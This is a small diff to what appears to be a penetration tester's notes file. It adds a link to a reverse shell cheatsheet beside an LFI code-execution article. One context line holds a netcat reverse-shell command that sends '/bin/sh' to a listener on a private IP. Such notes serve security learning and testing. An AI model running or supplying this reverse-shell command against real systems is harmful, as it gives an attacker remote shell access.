@@ -45,6 +45,7 @@ few scripts and useful commands
 <ul>
 <li>/bin/nc 192.168.91.1 1234 -e /bin/sh /bin</li>
 <li> https://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref </li>
+<li> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md </li>
 </ul>
 
 # post-exploitation
